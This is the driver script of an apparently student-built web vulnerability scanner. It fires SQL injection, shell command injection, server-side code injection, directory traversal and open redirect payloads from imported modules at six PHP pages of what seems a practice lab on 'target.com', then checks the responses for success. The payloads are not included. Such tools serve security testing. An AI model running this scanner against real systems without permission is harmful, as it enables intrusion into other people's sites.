import requests
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib


BASE_URL = "http://target.com"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"

def injectPayload(url, method, paramname, params, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = ""
	method = method.upper()
	params[paramname] = payload[0]

	#if get
	if method == "GET":
		paramstr = "&".join("%s=%s" % (k,v) for k,v in params.items())
		getURL = parsedURL + "?" + paramstr
		
		content = requests.get(getURL)
	#if post
	elif method == "POST":
		content = requests.post(parsedURL, data=params)
	
	result = checkSuccess(content,payload, parsedURL, method, paramname, params,verbose)

	
	#if function returns:
	if result is True:
		print(url, payload)
		return True
	return False


def getId(expClass):
	if expClass == sql_injection:
		return 0
	elif expClass == server_injection:
		return 1
	elif expClass == directory_traversal:
		return 2
	elif expClass == open_redirect:
		return 3
	elif expClass == cross_site_request_forgery:
		return 4
	elif expClass == shell_command:
		return 5

def checkSuccess(content, payload,url, method, paramname,params, v=False):
	attackType = payload[1]
	html = content.text

	#===== check for directory traversal =====
	if attackType == directory_traversal:
		return dirtraversal.checkSuccess(html)

	#======= check for shell command injection ======
	if attackType == shell_command:
		return cmd.checkSuccess(html)

	if attackType == sql_injection:
		return sqli.checkSuccesswy(content,url,method,paramname,params,payload)

	#====== check for open_redirect=======
	if attackType == open_redirect:
		return oRedirect.checkSuccess(content)
	
	#=======check for server_injection ====
	if attackType == server_injection and len(content.history) == 0 :
		return ssci.checkSuccess(BASE_URL, content)

	return None;
	
def get_payloads(v=False):
	payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

	if v == True:
		for p in payloads:
			print p[0]

	return payloads


if __name__ == "__main__":

	
	## check all pages
	payloads = get_payloads()
	url_list = ['/directorytraversal/directorytraversal.php',
				"/commandinjection/commandinjection.php",
				"/sqli/sqli.php",
				"/serverside/eval2.php",
				"/openredirect/openredirect.php",
				"/serverside/serverside.php"]


	for payload in payloads:
		injectPayload(url_list[0],  'GET','ascii', {"ascii":"cat","utf":"dog"},payload)
		injectPayload(url_list[1], 'POST', "host", {"host":""},payload)
		injectPayload(url_list[2],  "POST", "username", {"username":""}, payload)
		injectPayload(url_list[3],  "GET", "page", {"page":""}, payload)
		injectPayload(url_list[4],  "GET", "redirect",{"redirect":""}, payload)
		injectPayload(url_list[5], "GET", "page", {"page":"apples"}, payload)
